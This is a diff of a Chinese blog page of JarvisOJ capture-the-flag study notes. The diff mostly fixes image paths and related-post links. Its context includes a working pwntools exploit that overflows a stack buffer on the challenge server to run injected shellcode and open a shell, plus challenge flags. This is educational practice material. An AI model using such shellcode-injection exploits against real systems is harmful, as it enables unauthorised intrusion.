@@ -319,7 +319,7 @@
 
 	<a href="/2019/06/02/jarvisoj学习笔记/" itemprop="url">
 		<time datetime="2019-06-02T09:34:02.000Z" itemprop="dateUpdated">
-	  		2019-09-16
+	  		2019-11-13
 	  </time>
 	</a> 
 
@@ -402,7 +402,7 @@ XYYY YXXX XYXX XXY XYY X XYY YX YYXX
 这里给你一段shellcode，你能正确使用并最后得到flag吗？</code></pre><p>百度说，用<a href="https://github.com/inquisb/shellcodeexec">shellcodeexec</a>跑一下就出来了，电脑还提示有毒，吓的差点没敢用，最后为ctf献身了。</p>
 <p>flag ：PCTF{Begin_4_good_pwnn3r}</p>
 <h2 id="0x12-取证"><a href="#0x12-取证" class="headerlink" title="0x12 取证"></a>0x12 取证</h2><pre><code>有一款取证神器如下图所示，可以从内存dump里分析出TureCrypt的密钥，你能找出这款软件的名字吗？名称请全部小写。</code></pre><p><img src="https://dn.jarvisoj.com/umeditor/20160608/28601465358215259.JPG" alt></p>
-<p>百度，你会得到你想要的</p>
+<p>百度</p>
 <p>PCTF{volatility}</p>
 <h2 id="0x13-ROPGadget"><a href="#0x13-ROPGadget" class="headerlink" title="0x13 ROPGadget"></a>0x13 ROPGadget</h2><pre><code>都说学好汇编是学习PWN的基础，以下有一段ROPGadget的汇编指令序列，请提交其十六进制机器码(大写，不要有空格)
 
@@ -460,11 +460,11 @@ bacoN is one of aMerICa&apos;S sWEethEartS. it&apos;s A dARlinG, SuCCulEnt fOoD 
 
 <p>得到flag</p>
 <h2 id="0x02-XMAN-level-1"><a href="#0x02-XMAN-level-1" class="headerlink" title="0x02 [XMAN]level 1"></a>0x02 [XMAN]level 1</h2><pre><code>nc pwn2.jarvisoj.com 9877</code></pre><p>文件下载之后还是走程序，file-》checksec-》再进入正式分析</p>
-<p><img src="//github.com/stone-o/stone-o.github.io/2019/06/02/jarvisoj学习笔记/%5CJarvisoj%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%5Clevel1_1.png" alt></p>
-<p><img src="//github.com/stone-o/stone-o.github.io/2019/06/02/jarvisoj学习笔记/%5CJarvisoj%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%5Clevel1_2.png" alt></p>
+<p><img src="//github.com/stone-o/stone-o.github.io/2019/06/02/jarvisoj学习笔记/level1_1.png" alt></p>
+<p><img src="//github.com/stone-o/stone-o.github.io/2019/06/02/jarvisoj学习笔记/level1_2.png" alt></p>
 <p>NX disabled，没有canary，没有PIE，防护基本上一点没开</p>
 <p>进IDA看一眼，没有shell，既然堆栈内容可以执行，那我们就构造一个shell</p>
-<p><img src="//github.com/stone-o/stone-o.github.io/2019/06/02/jarvisoj学习笔记/%5CJarvisoj%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%5Clevel1_3.png" alt></p>
+<p><img src="//github.com/stone-o/stone-o.github.io/2019/06/02/jarvisoj学习笔记/Jarvisoj%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%5Clevel1_3.png" alt></p>
 <p>每次运行时候输出的十六进制就是buf的首地址，所以把新构造的shell放在这个首地址，然后把使用栈时候的返回地址覆盖上buf的首地址，回来执行构造的shell。</p>
 <p>上代码：</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9877</span>)</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">'debug'</span>,arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">buf = io.recvline()[<span class="number">14</span>:<span class="number">-2</span>]  <span class="comment">#接收返回数据中的buf地址</span></span><br><span class="line">buf_addr = int(buf,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())    <span class="comment"># 构造shell</span></span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">'A'</span>*(<span class="number">0x88</span>+<span class="number">4</span>-len(shellcode)) + p32(buf_addr)</span><br><span class="line"><span class="comment"># 0x88是栈大小，4是填充原ebp</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()    <span class="comment"># 交互</span></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
@@ -517,6 +517,29 @@ bacoN is one of aMerICa&apos;S sWEethEartS. it&apos;s A dARlinG, SuCCulEnt fOoD 
 <div class="relate-post">
 	
 		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/12/01/mysql只能使用sudo登录/" title="mysql只能使用sudo登录">
+								mysql只能使用sudo登录			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十二月 1日, 2019				
+							</p>
+							<p class="relate-post-content">
+								
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/12/01/mysql只能使用sudo登录/" title="mysql只能使用sudo登录">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="mysql只能使用sudo登录"/>
+							</a>
+						</div>
+					</li>											
+			
 			
 					<li>
 						<div class="relate-post-text">
@@ -726,36 +749,6 @@ Ubuntu
 							<a href="/2018/12/01/hexo-从零搭建/" title="hexo 从零搭建(ubuntu)">				
 								
 								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="hexo 从零搭建(ubuntu)"/>
-							</a>
-						</div>
-					</li>											
-			
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2018/05/14/计算机组成原理/" title="计算机组成原理">
-								计算机组成原理			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								五月 14日, 2018				
-							</p>
-							<p class="relate-post-content">
-								
-计算机层次结构计算机分类和发展方向
-指令和数据流
-
-单指令流&amp;单数据流SISD（冯诺依曼体系）
-单指令流&amp;多数据流SIMD（阵列处理器、向量处理器）
-多指令流&amp;单数据流MISD（不存在）
-多指令流&amp;多...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2018/05/14/计算机组成原理/" title="计算机组成原理">				
-								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="计算机组成原理"/>
 							</a>
 						</div>
 					</li>											
